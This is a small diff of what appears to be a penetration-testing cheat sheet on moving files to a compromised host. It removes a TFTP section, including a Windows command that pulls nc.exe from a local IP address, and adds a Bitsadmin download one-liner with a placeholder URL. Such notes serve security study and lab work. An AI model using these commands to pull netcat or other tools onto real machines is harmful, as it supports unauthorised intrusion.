@@ -1,12 +1,10 @@
 # TFTP
 
-- Windows XP and Win 2003 contain tftp client. Windows 7 do not by default 
-- tfpt clients are usually non-interactive, so they could work through an obtained shell 
+- to be continued
 
-atftpd --daemon --port 69 /tftp
-Windows> tftp -i 192.168.30.45 GET nc.exe
+# Bitsadmin
 
-
+- Bitsadmin /transfer n http://url saved_path
 
 # FTP (pyftpdlib client on Kali)
 
